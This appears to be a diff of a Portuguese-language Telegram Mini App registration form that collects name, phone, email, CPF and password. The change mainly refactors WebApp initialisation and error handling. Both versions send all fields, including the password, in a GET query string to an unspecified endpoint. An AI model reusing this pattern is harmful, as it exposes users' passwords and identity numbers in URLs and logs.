@@ -25,16 +25,14 @@
 <button id="btnEnviar" class="btn" onclick="confirmar()">Enviar Dados</button>
 
 <script>
-  // Inicialização do Telegram WebApp
-  let tg = null;
+  let tg = window.Telegram.WebApp;
+  
+  // Inicialização básica
   try {
-    if (window.Telegram && window.Telegram.WebApp) {
-      tg = window.Telegram.WebApp;
-      tg.ready();
-      tg.expand();
-    }
+    tg.ready();
+    tg.expand();
   } catch (e) {
-    console.warn("Executando fora do Telegram");
+    console.error("Erro ao iniciar WebApp:", e);
   }
 
   function confirmar() {
@@ -42,15 +40,11 @@
     const senha = document.getElementById('senha').value;
 
     if (!nome || !senha) {
-      const msg = "Por favor, preencha o nome e a senha.";
-      if (tg && tg.showAlert) {
-        try { tg.showAlert(msg); } catch(e) { alert(msg); }
-      } else {
-        alert(msg);
-      }
+      alert("Por favor, preencha o nome e a senha.");
       return;
     }
 
+    // Confirm simples para evitar erro de método não suportado
     if (confirm("Deseja confirmar o envio dos dados?")) {
       enviar();
     }
@@ -63,43 +57,44 @@
     btn.disabled = true;
     btn.innerText = "PROCESSANDO...";
 
-    // Pega o ID do Telegram de forma dinâmica
+    // PEGA O ID REAL DO TELEGRAM
     let cleanChatId = "PC_TEST";
-    if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
+    if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
         cleanChatId = tg.initDataUnsafe.user.id;
     }
 
     const params = new URLSearchParams({
-        chatId: cleanChatId,
-        nome: document.getElementById('nome').value,
-        telefone: document.getElementById('telefone').value,
-        email: document.getElementById('email').value,
-        cpf: document.getElementById('cpf').value,
-        senha: document.getElementById('senha').value
+      chatId: cleanChatId,
+      nome: document.getElementById('nome').value,
+      telefone: document.getElementById('telefone').value,
+      email: document.getElementById('email').value,
+      cpf: document.getElementById('cpf').value,
+      senha: document.getElementById('senha').value
     });
 
     try {
-        const response = await fetch(`${baseUrl}?${params.toString()}`);
+      const response = await fetch(`${baseUrl}?${params.toString()}`);
 
-        if (response.ok) {
-            const msgSucesso = "✅ Cadastro realizado com sucesso!";
-            if (tg && tg.showAlert) {
-                tg.showAlert(msgSucesso, () => {
-                    tg.close(); // Fecha o Mini App e volta pro Bot
-                });
-            } else {
-                alert(msgSucesso);
-            }
-        } else {
-            throw new Error("Erro no servidor. Tente novamente.");
+      if (response.ok) {
+        alert("✅ Cadastro realizado!");
+        // Tenta fechar o WebApp, se não der, avisa o usuário
+        try {
+            tg.close();
+        } catch(e) {
+            console.log("Não foi possível fechar o app automaticamente.");
         }
+      } else {
+        throw new Error("Erro no servidor: " + response.status);
+      }
+
     } catch (err) {
-        alert("❌ " + err.message);
-        btn.disabled = false;
-        btn.innerText = "Enviar Dados";
+      alert("❌ Erro: " + err.message);
+      btn.disabled = false;
+      btn.innerText = "Enviar Dados";
     }
-}
+  }
 </script>
 </body>
 
 </html>
+
